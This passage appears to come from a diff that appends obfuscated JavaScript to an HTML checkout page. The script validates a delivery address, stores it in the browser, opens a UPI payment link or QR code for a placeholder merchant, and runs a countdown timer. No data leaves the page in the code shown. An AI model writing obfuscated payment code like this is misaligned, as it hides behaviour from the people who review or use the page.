_0x5e3a8f=['target','querySelectorAll','mobile','#ffffff','done','Please\x20select\x20a\x20UPI\x20option\x20first.','step2','upi://pay?pa=merchant@upi&pn=DemoMerchant&am=499&cu=INR','innerHTML','replace','flex','fullname','step1','710580QMXtqb','house','step\x20','3897397Azgwyl','setItem','none','href','4PycVLB','Enter\x20a\x20valid\x206-digit\x20pincode.','Address\x20saved.\x20Proceeding\x20to\x20Order\x20Summary...','classList','pincode','className','qrcode','553985aIVRPh','length','value','style','city','addrFeedback','road','floor','timerText','&gt;','<div\x20style=\x22margin-top:6px\x22\x20class=\x22small-muted\x22>','checkout_address_demo','data-link','deliveredTo','state','&#39;','1721397eJKxkt','Enter\x20a\x20valid\x20full\x20name.','30VLrfQt','getItem','</div>','qrModal','color','&amp;','log','CorrectLevel','innerText','20zSHSzh','245707rOovLy','trim','pageTitle','stringify','getAttribute','getElementById','<div\x20style=\x22font-size:13px;color:var(--muted)\x22>Delivered\x20to:</div>','removeItem','24392Xaoljz','<div\x20class=\x22small-muted\x22\x20style=\x22margin-top:4px\x22>','active','<div\x20style=\x22font-weight:700;margin-top:6px\x22>','1315954NEWAhV','765qQARAo','inactive','test','modal','.upi-option','Please\x20save\x20a\x20delivery\x20address\x20first.','&lt;','payDelivered','#2b7a2b','Payment','#000000','forEach','#c00','block','Add\x20delivery\x20address','display','push','join','min\x20','remove'];_0xbdc0=function(){return _0x5e3a8f;};return _0xbdc0();}function validateAddress(_0x252611){const _0x4e4272=_0xa5be5;if(!_0x252611[_0x4e4272(0xb2)]||_0x252611['fullname'][_0x4e4272(0xdf)]()[_0x4e4272(0xc3)]<0x2)return _0x4e4272(0xd3);if(!/^[6-9]\d{9}$/[_0x4e4272(0xed)](_0x252611[_0x4e4272(0xa9)]))return'Enter\x20a\x20valid\x2010-digit\x20Indian\x20mobile\x20number\x20starting\x206-9.';if(!/^\d{6}$/[_0x4e4272(0xed)](_0x252611['pincode']))return _0x4e4272(0xbc);if(!_0x252611[_0x4e4272(0xc6)]||!_0x252611['state'])return'City\x20and\x20State\x20are\x20required.';return null;}(function init(){const _0x325011=_0xa5be5;localStorage[_0x325011(0xe5)](localKey);const _0x3beeb0=loadAddress();_0x3beeb0&&(document[_0x325011(0xe3)](_0x325011(0xb2))['value']=_0x3beeb0[_0x325011(0xb2)]||'',document[_0x325011(0xe3)](_0x325011(0xa9))['value']=_0x3beeb0[_0x325011(0xa9)]||'',document[_0x325011(0xe3)](_0x325011(0xbf))[_0x325011(0xc4)]=_0x3beeb0[_0x325011(0xbf)]||'',document[_0x325011(0xe3)]('city')[_0x325011(0xc4)]=_0x3beeb0['city']||'',document[_0x325011(0xe3)]('state')[_0x325011(0xc4)]=_0x3beeb0[_0x325011(0xd0)]||'',document[_0x325011(0xe3)](_0x325011(0xb5))[_0x325011(0xc4)]=_0x3beeb0[_0x325011(0xb5)]||'',document[_0x325011(0xe3)]('road')['value']=_0x3beeb0['road']||'',populateSummaryUI(_0x3beeb0)),setStepVisual(0x1);}());function saveAddress(){const _0xd92436=_0xa5be5,_0x214f21={'fullname':document['getElementById'](_0xd92436(0xb2))[_0xd92436(0xc4)][_0xd92436(0xdf)](),'mobile':document[_0xd92436(0xe3)]('mobile')[_0xd92436(0xc4)][_0xd92436(0xdf)](),'pincode':document[_0xd92436(0xe3)]('pincode')[_0xd92436(0xc4)][_0xd92436(0xdf)](),'city':document['getElementById'](_0xd92436(0xc6))[_0xd92436(0xc4)]['trim'](),'state':document[_0xd92436(0xe3)](_0xd92436(0xd0))['value'],'house':document[_0xd92436(0xe3)](_0xd92436(0xb5))[_0xd92436(0xc4)][_0xd92436(0xdf)](),'road':document['getElementById'](_0xd92436(0xc8))[_0xd92436(0xc4)][_0xd92436(0xdf)]()},_0x533461=validateAddress(_0x214f21),_0x4aed59=document[_0xd92436(0xe3)](_0xd92436(0xc7));if(_0x533461){_0x4aed59[_0xd92436(0xdc)]=_0x533461,_0x4aed59[_0xd92436(0xc5)]['color']=_0xd92436(0x9f);return;}localStorage[_0xd92436(0xb8)](localKey,JSON[_0xd92436(0xe1)](_0x214f21)),_0x4aed59['innerText']=_0xd92436(0xbd),_0x4aed59['style'][_0xd92436(0xd8)]=_0xd92436(0x9b),populateSummaryUI(_0x214f21),setTimeout(()=>setStepVisual(0x2),0x15e);}function loadAddress(){const _0x2beda2=_0xa5be5;try{const _0x444a44=localStorage[_0x2beda2(0xd5)](localKey);return _0x444a44?JSON['parse'](_0x444a44):null;}catch(_0xcbce48){return null;}}function populateSummaryUI(_0x47ca70){const _0x38b888=_0xa5be5;if(!_0x47ca70)return;const _0x312455=document[_0x38b888(0xe3)](_0x38b888(0xcf)),_0x33049b=[];if(_0x47ca70[_0x38b888(0xb5)])_0x33049b[_0x38b888(0xa3)](_0x47ca70['house']);if(_0x47ca70[_0x38b888(0xc8)])_0x33049b['push'](_0x47ca70[_0x38b888(0xc8)]);_0x33049b['push'](_0x47ca70[_0x38b888(0xc6)]),_0x33049b['push'](_0x47ca70[_0x38b888(0xd0)]),_0x33049b[_0x38b888(0xa3)](_0x47ca70[_0x38b888(0xbf)]),_0x312455[_0x38b888(0xaf)]=_0x38b888(0xe4)+(_0x38b888(0xe9)+escapeHtml(_0x47ca70[_0x38b888(0xb2)])+_0x38b888(0xd6))+(_0x38b888(0xe7)+escapeHtml(_0x47ca70['mobile'])+_0x38b888(0xd6))+(_0x38b888(0xcc)+escapeHtml(_0x33049b[_0x38b888(0xa4)](',\x20'))+'</div>');const _0x275172=document[_0x38b888(0xe3)](_0x38b888(0x9a));if(_0x275172)_0x275172[_0x38b888(0xaf)]=_0x312455[_0x38b888(0xaf)];}function editAddress(){const _0x424a78=_0xa5be5;setStepVisual(0x1);const _0x18049c=loadAddress();_0x18049c&&(document[_0x424a78(0xe3)](_0x424a78(0xb2))['value']=_0x18049c[_0x424a78(0xb2)]||'',document[_0x424a78(0xe3)](_0x424a78(0xa9))['value']=_0x18049c[_0x424a78(0xa9)]||'',document[_0x424a78(0xe3)]('pincode')['value']=_0x18049c[_0x424a78(0xbf)]||'',document[_0x424a78(0xe3)](_0x424a78(0xc6))[_0x424a78(0xc4)]=_0x18049c[_0x424a78(0xc6)]||'',document['getElementById']('state')[_0x424a78(0xc4)]=_0x18049c[_0x424a78(0xd0)]||'',document['getElementById']('house')['value']=_0x18049c[_0x424a78(0xb5)]||'',document[_0x424a78(0xe3)]('road')[_0x424a78(0xc4)]=_0x18049c[_0x424a78(0xc8)]||'');}function toPayment(){const _0x4a661c=_0xa5be5,_0x93b571=loadAddress();if(!_0x93b571){document['getElementById']('addrFeedback')[_0x4a661c(0xdc)]=_0x4a661c(0x98),document[_0x4a661c(0xe3)](_0x4a661c(0xc7))['style']['color']=_0x4a661c(0x9f),setStepVisual(0x1);return;}populateSummaryUI(_0x93b571),setStepVisual(0x3);}function selectUPI(_0x3a3534){const _0x3c7539=_0xa5be5;document[_0x3c7539(0xa8)](_0x3c7539(0xef))[_0x3c7539(0x9e)](_0x4c247f=>_0x4c247f[_0x3c7539(0xbe)][_0x3c7539(0xa6)](_0x3c7539(0xe8))),_0x3a3534[_0x3c7539(0xbe)]['add'](_0x3c7539(0xe8));const _0x1c3666=_0x3a3534[_0x3c7539(0xe2)](_0x3c7539(0xce));selectedUpi=_0x1c3666;}function openQR(_0x2af178){const _0xa0e98c=_0xa5be5,_0x2d8628=document[_0xa0e98c(0xe3)](_0xa0e98c(0xd7)),_0x37259a=document[_0xa0e98c(0xe3)](_0xa0e98c(0xc1));_0x37259a['innerHTML']='',new QRCode(_0x37259a,{'text':_0x2af178,'width':0xdc,'height':0xdc,'colorDark':_0xa0e98c(0x9d),'colorLight':_0xa0e98c(0xaa),'correctLevel':QRCode[_0xa0e98c(0xdb)]['H']}),_0x2d8628[_0xa0e98c(0xc5)][_0xa0e98c(0xa2)]=_0xa0e98c(0xb1);}function closeQR(_0x209b7f){const _0x5395c4=_0xa5be5;if(_0x209b7f&&_0x209b7f[_0x5395c4(0xa7)]&&_0x209b7f[_0x5395c4(0xa7)][_0x5395c4(0xbe)]&&_0x209b7f[_0x5395c4(0xa7)][_0x5395c4(0xbe)]['contains'](_0x5395c4(0xee))){document[_0x5395c4(0xe3)](_0x5395c4(0xd7))['style']['display']=_0x5395c4(0xb9);return;}document[_0x5395c4(0xe3)](_0x5395c4(0xd7))['style'][_0x5395c4(0xa2)]=_0x5395c4(0xb9);}function _0x7fd8(_0x462b84,_0x39f305){const _0xbdc058=_0xbdc0();return _0x7fd8=function(_0x7fd89a,_0x413118){_0x7fd89a=_0x7fd89a-0x98;let _0x59745d=_0xbdc058[_0x7fd89a];return _0x59745d;},_0x7fd8(_0x462b84,_0x39f305);}function buildUPI(_0x2b605c){const _0x579f65=_0xa5be5;if(!_0x2b605c)return null;if(_0x2b605c==='qr')return _0x579f65(0xae);return _0x2b605c;}function payNow(){const _0x1b0c75=_0xa5be5;if(!selectedUpi){alert(_0x1b0c75(0xac));return;}if(selectedUpi==='qr'){const _0x1bdf05=buildUPI('qr');openQR(_0x1bdf05);return;}const _0x18f1f4=buildUPI(selectedUpi);window['location'][_0x1b0c75(0xba)]=_0x18f1f4;}function escapeHtml(_0x2471c2){const _0x3a9d94=_0xa5be5;return String(_0x2471c2)[_0x3a9d94(0xb0)](/[&<>"']/g,function(_0x4a7640){const _0x4869df=_0x3a9d94;return{'&':_0x4869df(0xd9),'<':_0x4869df(0x99),'>':_0x4869df(0xcb),'\x22':'&quot;','\x27':_0x4869df(0xd1)}[_0x4a7640];});}(function(){const _0x223759=_0xa5be5;let _0x1c8858=0x5*0x3c;const _0x29d068=document['getElementById'](_0x223759(0xca));setInterval(()=>{const _0x18c44c=_0x223759;if(_0x1c8858<=0x0)return;_0x1c8858--;const _0x1bdb4d=Math[_0x18c44c(0xc9)](_0x1c8858/0x3c),_0xdda90c=_0x1c8858%0x3c;_0x29d068[_0x18c44c(0xdc)]=_0x1bdb4d+_0x18c44c(0xa5)+(_0xdda90c<0xa?'0'+_0xdda90c:_0xdda90c)+'sec';},0x3e8);}()),function init(){const _0x29c41b=_0xa5be5,_0x574280=loadAddress();_0x574280&&(document[_0x29c41b(0xe3)]('fullname')['value']=_0x574280[_0x29c41b(0xb2)]||'',document['getElementById']('mobile')[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xa9)]||'',document[_0x29c41b(0xe3)](_0x29c41b(0xbf))['value']=_0x574280['pincode']||'',document[_0x29c41b(0xe3)](_0x29c41b(0xc6))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xc6)]||'',document['getElementById'](_0x29c41b(0xd0))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xd0)]||'',document[_0x29c41b(0xe3)](_0x29c41b(0xb5))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xb5)]||'',document[_0x29c41b(0xe3)](_0x29c41b(0xc8))[_0x29c41b(0xc4)]=_0x574280[_0x29c41b(0xc8)]||'',populateSummaryUI(_0x574280)),setStepVisual(0x1);}(),hi();
+</script>
+</body>
+</html>
